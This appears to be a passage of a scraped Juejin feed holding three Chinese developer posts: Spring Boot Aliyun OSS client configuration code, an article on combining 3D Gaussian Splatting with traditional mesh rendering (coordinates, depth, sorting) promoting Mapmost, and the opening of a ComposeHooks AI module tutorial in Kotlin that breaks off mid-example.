<p>只需要依赖是 spring-boot-starter 就可以。</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
<span class="hljs-comment">&lt;!--    帮助yaml提示    --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-configuration-processor<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">optional</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">optional</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Configuration</span>
<span class="hljs-meta">@EnableConfigurationProperties(OSSProperties.class)</span> <span class="hljs-comment">// 引入配置类</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OSSConfig</span> {

    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> OSS <span class="hljs-title function_">endpoint</span><span class="hljs-params">(OSSProperties ossProperties)</span> {
        <span class="hljs-type">DefaultCredentialProvider</span> <span class="hljs-variable">defaultCredentialProvider</span> <span class="hljs-operator">=</span>
                <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultCredentialProvider</span>(ossProperties.getAccessKeyId(), ossProperties.getSecretAccessKey());
        <span class="hljs-type">ClientBuilderConfiguration</span> <span class="hljs-variable">clientBuilderConfiguration</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClientBuilderConfiguration</span>();
        clientBuilderConfiguration.setSignatureVersion(SignVersion.V4);
        <span class="hljs-keyword">return</span> OSSClientBuilder.create()
                .endpoint(<span class="hljs-string">"https://"</span> + ossProperties.getEndpoint())
                .credentialsProvider(defaultCredentialProvider)
                .clientConfiguration(clientBuilderConfiguration)
                .region(extractRegion(ossProperties.getEndpoint()))
                .build();
    }

    <span class="hljs-comment">/**
     * 获取 region
     */</span>
    <span class="hljs-keyword">private</span> String <span class="hljs-title function_">extractRegion</span><span class="hljs-params">(String endpoint)</span> {
        <span class="hljs-keyword">if</span> (endpoint == <span class="hljs-literal">null</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
        <span class="hljs-type">int</span> <span class="hljs-variable">start</span> <span class="hljs-operator">=</span> endpoint.indexOf(<span class="hljs-string">"oss-"</span>);
        <span class="hljs-type">int</span> <span class="hljs-variable">end</span> <span class="hljs-operator">=</span> endpoint.indexOf(<span class="hljs-string">".aliyuncs.com"</span>);
        <span class="hljs-keyword">if</span> (start == -<span class="hljs-number">1</span> || end == -<span class="hljs-number">1</span> || start + <span class="hljs-number">4</span> &gt;= end)
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">"Invalid endpoint: "</span> + endpoint);
        <span class="hljs-keyword">return</span> endpoint.substring(start + <span class="hljs-number">4</span>, end);
    }

}

</code></pre>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Data</span>
<span class="hljs-meta">@ConfigurationProperties(prefix = "aliun.oss")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OSSProperties</span> {

    <span class="hljs-keyword">private</span> String endpoint;
    <span class="hljs-keyword">private</span> String accessKeyId;
    <span class="hljs-keyword">private</span> String secretAccessKey;
}
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[【高斯泼溅】当3DGS遇上传统模型：从“画在一起”到“画得对”的全攻略]]></title>    <link>https://juejin.cn/post/7591786340322099234</link>    <guid>https://juejin.cn/post/7591786340322099234</guid>    <pubDate>2026-01-06T05:23:46.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7591786340322099234" data-draft-id="7591836822154788864" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="【高斯泼溅】当3DGS遇上传统模型：从“画在一起”到“画得对”的全攻略​"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2026-01-06T05:23:46.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Mapmost"/> <meta itemprop="url" content="https://juejin.cn/user/1679709496936343"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            【高斯泼溅】当3DGS遇上传统模型：从“画在一起”到“画得对”的全攻略​
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1679709496936343/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Mapmost
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-06T05:23:46.000Z" title="Tue Jan 06 2026 05:23:46 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在真实场景重建、数字孪生与新一代三维表达体系中，3DGS正迅速成为不可忽视的技术方向。凭借在细节保真度、重建效率和真实感上的优势，它让传统基于三维精模、倾斜摄影和网格建模的表达方式，首次在“真实还原”层面显得力不从心。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bdfc4810de024a29b60f9ef18b701bb2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTWFwbW9zdA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768281826&amp;x-signature=F34FpYMfPWHQG5XvTeo5Y0c410Q%3D" alt="" loading="lazy"/></p>
<p><em>城市场景-3DGS与倾斜融合</em></p>
<p>但在真实的工程系统中，几乎不存在只依赖3DGS的完整方案。结构化几何、可交互对象、业务逻辑以及语义与属性承载，仍然高度依赖成熟稳定的传统三维模型体系。工程实践的主流路径，也始终是扩展既有模型应用，而非用3DGS全面替代。</p>
<p>因此，一个关键问题随之出现：<strong>能否将3DGS与传统三维模型放在同一场景中协同渲染？</strong></p>
<p>答案是肯定的：但难点并不在“能不能画”，而在于是否画得<strong>正确、稳定</strong>且<strong>具备长期工程可维护性</strong>。因为3DGS与传统模型，本质上代表的是两套截然不同的<strong>空间假设与渲染哲学</strong>，它们的融合，更像是一场发生在渲染架构层级的正面碰撞，而非简单的技术拼接。</p>
<h2 data-id="heading-0">坐标体系的碰撞</h2>
<p>在3DGS与传统三维模型的融合中，<strong>坐标体系是最先出问题、也最容易被忽视的一环。</strong></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/38f2f97852fa4ba3bac4d668908b34a1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTWFwbW9zdA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768281826&amp;x-signature=EFu7IQzpHJHoeWKBOYwCCaMO%2FFI%3D" alt="" loading="lazy"/></p>
<p>3DGS通常来自COLMAP、Nerfstudio等重建流程，本质上工作在以相机群为中心的局部空间中：</p>
<ul>
<li>原点无语义</li>
<li>轴向不固定</li>
<li>单位虽多为米，但不保证遵循Y-up/Z-up规范</li>
</ul>
<p>而传统三维模型恰恰相反，它们始终运行在语义明确、规则稳定的世界坐标系统里，原点、轴向、单位与左右手规则都是系统级前提。</p>
<p>如果在<strong>数据阶段</strong>没有完成严格的坐标对齐，就将两者直接放入同一场景，漂浮、倾斜、比例失真几乎不可避免。<br/>
在shader中“临时掰正”画面，或许能骗过Demo，但在多模型、多数据源的工程系统里只会迅速失控。</p>
<p><strong>坐标问题必须在数据阶段解决，而不是在渲染阶段掩盖。</strong><br/>
只有当3DGS与传统模型真正共享同一个World Space，后续关于深度、遮挡与排序的问题才值得继续讨论。</p>
<h2 data-id="heading-1">深度与遮挡的摩擦</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/009e67253c004a1bb6733ac5b87bcf9d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTWFwbW9zdA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768281826&amp;x-signature=N1P5OEmVcfOAWsQSHUaZeGf0Pr0%3D" alt="" loading="lazy"/></p>
<p>在坐标体系统一之后，第二个必然遇到的问题是<strong>深度关系</strong>。</p>
<p>在传统的模型渲染中，这个问题几乎不需要开发者关心：</p>
<ul>
<li>模型是不透明的</li>
<li>GPU会自动记录每个像素的“距离”</li>
<li>近的物体自然遮住远的物体</li>
</ul>
<p>这套机制就是我们常说的<strong>深度缓冲</strong>(Depth Buffer)。</p>
<p>如果简单地将3D Gaussian Splatting当作普通透明物体插入渲染队列，在实际场景中很容易出现一系列问题：</p>
<ul>
<li>穿模</li>
<li>悬浮</li>
<li>遮挡关系错误</li>
</ul>
<p>这并不是参数没调好，而是渲染路径本身就不成立。</p>
<p>因此通常会将传统三维模型与3DGS拆分为不同的渲染阶段：</p>
<ul>
<li>先渲染传统三维模型中的不透明几何</li>
<li>完整写入深度缓冲</li>
<li>为场景建立稳定、可信的几何结构</li>
<li>再渲染3DGS</li>
<li>仅读取深度信息</li>
</ul>
<p>这种策略的核心思想是：<strong>几何先行，真实细节后置</strong>。结构由Mesh决定，真实感由3DGS补充，而不是相互竞争深度主导权。</p>
<h2 data-id="heading-2">排序的难点</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0c6fbe1efb6649c9a0ad27b3ad36a611~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTWFwbW9zdA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768281826&amp;x-signature=1UooW1VwdoshGbne%2FRpPMwNoEd4%3D" alt="" loading="lazy"/></p>
<p>如果说<strong>深度测试</strong>是传统三维模型世界能够成立的根本规则，那么在融合渲染体系中，<strong>排序几乎决定了3DGS是否还是真正的3D</strong>。</p>
<p>传统三维模型面对的是<strong>拓扑明确、数量有限</strong>的几何体，可见性主要依赖<strong>深度测试</strong>即可稳定解决；即便存在透明物体，也只是少量对象的顺序调整，问题规模始终可控。</p>
<p>而3DGS面对的是<strong>海量半透明高斯椭球</strong>：<br/>
每一个splat都参与颜色与透明度累积，渲染结果对绘制顺序高度敏感，<strong>顺序不再是优化项，而是正确性本身。</strong></p>
<p>任何试图让3DGS服从传统renderOrder、或直接塞进透明队列的方案，都会在规模和正确性上同时失效，</p>
<p>最终表现为：</p>
<ul>
<li>体积层次错乱</li>
<li>远近反转</li>
<li>画面发灰</li>
<li>甚至“糊成一团”</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b1f451b788ad4ce1b6d784f095edf604~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTWFwbW9zdA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768281826&amp;x-signature=urkZNRd2TpM%2FJOQ7p7aw8F2%2Bb5g%3D" alt="" loading="lazy"/></p>
<p>因此，在可落地的工程实践中，<strong>3DGS</strong>必须被视为与传统三维模型并行的<strong>渲染体系</strong>，而非从属关系：<br/>
传统模型继续依赖深度测试，负责建立稳定、可信的空间结构；<br/>
3DGS则必须拥有<strong>独立的排序体系</strong>，在GPU上通过视空间深度、分桶排序或层级裁剪等方式解决自身的可见性问题。</p>
<p>两者只在最终合成阶段以受控方式交互，例如基于深度进行裁剪或遮挡判断，而不是共享同一个透明队列。<br/>
只有在这种关系下，3DGS才能呈现出连续、可信的体积感，而不是退化为失序的点云效果。</p>
<h2 data-id="heading-3">Mapmost的实现</h2>
<p>在<strong>Mapmost</strong>的技术体系中，强调在数据阶段完成<strong>坐标体系统一</strong>，通过稳定的几何深度计算为3DGS提供可靠的遮挡基础，并采用独立的排序与LOD策略保障大规模场景下的渲染稳定性。</p>
<p>使用Mapmost SDK for WebGL，可实现3DGS与倾斜模型、通用三维模型的融合表达，满足智慧园区、智慧交通等数字孪生应用开发需求。</p>
<p>3DGS与倾斜融合加载效果</p>
<p>申请试用，请至<a href="https://link.juejin.cn?target=www.mapmost.com" target="_blank" title="www.mapmost.com" ref="nofollow noopener noreferrer">Mapmost</a>官网联系客服</p>
<p><strong>Mapmost 3DGS Builder在线体验版已上线~</strong></p>
<p><strong>欢迎体验:</strong> <a href="https://link.juejin.cn?target=studio.mapmost.com%2F3dgs" target="_blank" title="studio.mapmost.com/3dgs" ref="nofollow noopener noreferrer">studio.mapmost.com/3dgs</a></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d75dce3b9dbe454ca8b8ab3e4b197a92~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTWFwbW9zdA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768281826&amp;x-signature=2BMaB%2ByFW0R7%2F0qP1f%2BpHNCDGNo%3D" alt="" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[积极拥抱AI，ComposeHooks让你更方便地使用AI]]></title>    <link>https://juejin.cn/post/7591948263859830822</link>    <guid>https://juejin.cn/post/7591948263859830822</guid>    <pubDate>2026-01-06T05:30:20.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7591948263859830822" data-draft-id="7591805786399227930" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="积极拥抱AI，ComposeHooks让你更方便地使用AI"/> <meta itemprop="keywords" content="前端,Android"/> <meta itemprop="datePublished" content="2026-01-06T05:30:20.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Junerver"/> <meta itemprop="url" content="https://juejin.cn/user/729731450025422"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            积极拥抱AI，ComposeHooks让你更方便地使用AI
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/729731450025422/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Junerver
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-06T05:30:20.000Z" title="Tue Jan 06 2026 05:30:20 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在 Compose 项目中集成 AI 功能，你是不是也遇到过这些问题？</p>
<p>不同 AI 服务商的 API 各不相同，如何统一管理？多模态输入（文本、图片）怎么优雅处理？AI 返回的 JSON 如何自动解析成类型安全的对象？</p>
<p>现在，<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fjunerver%2FComposeHooks" target="_blank" title="https://github.com/junerver/ComposeHooks" ref="nofollow noopener noreferrer">ComposeHooks</a> 推出了 AI 模块，让我们在 Compose 中使用 AI 变得前所未有的简单。</p>
<h2 data-id="heading-0">两个核心 Hooks</h2>
<h3 data-id="heading-1">useChat - 多提供商聊天对话</h3>
<p><code>useChat</code> 是一个功能强大的聊天对话 hook，支持 10+ AI 服务商：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">val</span> (messages, isLoading, error, sendMessage, setMessages, append, reload, stop) = useChat {
    provider = Providers.OpenAI(apiKey = <span class="hljs-string">"sk-xxx"</span>)
    systemPrompt = <span class="hljs-string">"你是一个助手"</span>
    temperature = <span class="hljs-number">0.7f</span>
}

<span class="hljs-comment">// 发送文本消息</span>
sendMessage(<span class="hljs-string">"你好"</span>)

<span class="hljs-comment">// 发送图片消息</span>
sendMessage.withImage(<span class="hljs-string">"这是什么图片？"</span>, base64Image, <span class="hljs-string">"image/jpeg"</span>)

<span class="hljs-comment">// 重新生成最后回复</span>
reload()
</code></pre>
<p>支持的 Provider 包括：</p>
<ul>
<li>OpenAI、DeepSeek、Moonshot、Zhipu、Qwen、Groq、Together、MiMo（OpenAI 兼容）</li>
<li>Anthropic（Claude 系列）</li>
<li>Custom（自定义 OpenAI 兼容服务）</li>
</ul>
<h3 data-id="heading-2">useGenerateObject - 结构化对象生成</h3>
<p>这个 hook 是我在 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fjunerver%2FEatWhat" target="_blank" title="https://github.com/junerver/EatWhat" ref="nofollow noopener noreferrer">EatWhat</a> 项目中最常用的，它可以基于 JSON Schema 生成指定类型的数据：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-meta">@Schema</span>
<span class="hljs-meta">@Serializable</span>
<span class="hljs-keyword">data</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Recipe</span>(
    <span class="hljs-meta">@Description(<span class="hljs-string">"菜名"</span>)</span>
    <span class="hljs-keyword">val</span> name: String,
    <span class="hljs-meta">@Description(<span class="hljs-string">"食材列表"</span>)</span>
    <span class="hljs-keyword">val</span> ingredients: List&lt;String&gt;,
    <span class="hljs-meta">@Description(<span class="hljs-string">"烹饪步骤"</span>)</span>
